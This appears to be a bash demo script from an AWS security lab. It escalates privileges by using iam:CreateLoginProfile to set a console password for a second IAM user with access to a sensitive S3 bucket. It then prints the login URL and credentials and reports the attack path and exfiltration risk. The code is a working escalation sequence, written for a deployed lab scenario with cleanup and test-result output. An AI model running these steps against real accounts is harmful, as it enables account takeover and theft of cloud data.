#!/bin/bash

# Demo script for iam:CreateLoginProfile privilege escalation to S3 bucket access
# This script demonstrates how a user with CreateLoginProfile permission can escalate to S3 bucket access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-clp-bucket-starting-user"
HOP1_USER="pl-prod-clp-bucket-hop1"

# Generate a random password suffix (8 characters)
RANDOM_SUFFIX=$(openssl rand -hex 4)
PASSWORD="PathfinderLabs123!${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateLoginProfile to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Extract credentials from Terraform outputs
echo -e "${YELLOW}Step 1: Extracting credentials from Terraform outputs${NC}"
TERRAFORM_DIR="../../../../../.."
pushd $TERRAFORM_DIR > /dev/null

ACCESS_KEY=$(terraform output -raw prod_one_hop_to_bucket_iam_createloginprofile_starting_user_access_key_id 2>/dev/null)
SECRET_KEY=$(terraform output -raw prod_one_hop_to_bucket_iam_createloginprofile_starting_user_secret_access_key 2>/dev/null)

if [ -z "$ACCESS_KEY" ] || [ "$ACCESS_KEY" == "null" ] || [ -z "$SECRET_KEY" ] || [ "$SECRET_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not retrieve credentials from Terraform outputs${NC}"
    echo "Make sure the scenario is deployed: terraform apply"
    popd > /dev/null
    exit 1
fi

popd > /dev/null

# Export credentials as environment variables
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
unset AWS_SESSION_TOKEN  # Clear any session token

echo -e "${GREEN}✓ Successfully extracted and configured credentials${NC}\n"

# Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Current identity: $CURRENT_USER"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Discover target bucket
echo -e "${YELLOW}Step 4: Discovering target bucket${NC}"
# Try to get bucket name from Terraform output first
pushd $TERRAFORM_DIR > /dev/null
TARGET_BUCKET=$(terraform output -raw prod_one_hop_to_bucket_iam_createloginprofile_sensitive_bucket_name 2>/dev/null || echo "")
popd > /dev/null

# If Terraform output not available, try to discover via naming pattern
if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "null" ]; then
    echo "Terraform output not available, using expected naming pattern..."
    # Look for buckets matching our naming pattern
    TARGET_BUCKET=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-clp-')].Name | [0]" --output text 2>/dev/null || echo "")

    if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "None" ]; then
        echo -e "${YELLOW}Warning: Could not discover target bucket${NC}"
        TARGET_BUCKET="pl-sensitive-data-clp-${ACCOUNT_ID}"  # Fallback pattern
    fi
fi

echo "Target bucket: $TARGET_BUCKET"
echo -e "${GREEN}✓ Identified target bucket${NC}\n"

# Step 5: Check if hop1 user already has a login profile
echo -e "${YELLOW}Step 5: Checking if hop1 user has a login profile${NC}"
echo "Checking for existing login profile for user: $HOP1_USER"

if aws iam get-login-profile --user-name $HOP1_USER &> /dev/null; then
    echo -e "${RED}⚠ Login profile already exists for $HOP1_USER${NC}"
    echo "Please run ./cleanup_attack.sh first to remove the existing login profile"
    exit 1
else
    echo -e "${GREEN}✓ Confirmed: No login profile exists (ready for attack)${NC}"
fi
echo ""

# Step 6: Verify we don't have S3 bucket access yet
echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
echo "Target bucket: $TARGET_BUCKET"
echo "Attempting to list bucket contents (should fail)..."

if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# Step 7: Create login profile for hop1 user
echo -e "${YELLOW}Step 7: Creating login profile for hop1 user${NC}"
echo "Creating console password for user: $HOP1_USER"
echo "Password: $PASSWORD"

aws iam create-login-profile \
    --user-name $HOP1_USER \
    --password "$PASSWORD" \
    --no-password-reset-required

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created login profile!${NC}"
else
    echo -e "${RED}Failed to create login profile${NC}"
    exit 1
fi
echo ""

# Step 8: Display console login information
echo -e "${YELLOW}Step 8: Console login information${NC}"
CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
echo "Console login URL: $CONSOLE_URL"
echo "Username: $HOP1_USER"
echo "Password: $PASSWORD"
echo ""

echo -e "${GREEN}✓ Password successfully created!${NC}"
echo -e "${YELLOW}The hop1 user can now login to the AWS console with the new credentials${NC}"
echo ""
echo "  1. Open the console URL in a browser: $CONSOLE_URL"
echo "  2. Login with username: $HOP1_USER"
echo "  3. Login with password: $PASSWORD"
echo "  4. Navigate to S3 through the console interface"
echo "  5. View and download sensitive data from bucket: $TARGET_BUCKET"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:CreateLoginProfile permission)"
echo "2. Created login profile for: $HOP1_USER (user with S3 bucket access)"
echo "3. Achieved: Console access to sensitive S3 bucket"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (CreateLoginProfile) → $HOP1_USER → Console Login → S3 Bucket Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Login profile created for user: $HOP1_USER"
echo "- New console password: $PASSWORD"
echo "- Console login URL: $CONSOLE_URL"

echo -e "\n${YELLOW}Data Exfiltration Risk:${NC}"
echo "The compromised hop1 user can now:"
echo "  • Login to AWS Console with the created credentials"
echo "  • Access sensitive data in S3 bucket: $TARGET_BUCKET"
echo "  • Download and exfiltrate confidential information"
echo "  • List and read all objects in the bucket"

# Standardized test results output
echo ""
echo "TEST_RESULT:prod_one_hop_to_bucket_iam_createloginprofile:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_bucket_iam_createloginprofile:Successfully gained S3 bucket access via CreateLoginProfile escalation"
echo "TEST_METRICS:prod_one_hop_to_bucket_iam_createloginprofile:login_profile_created=true,console_access=true,bucket_access=available"
echo ""

echo -e "${RED}⚠ Warning: A login profile now exists for the hop1 user!${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
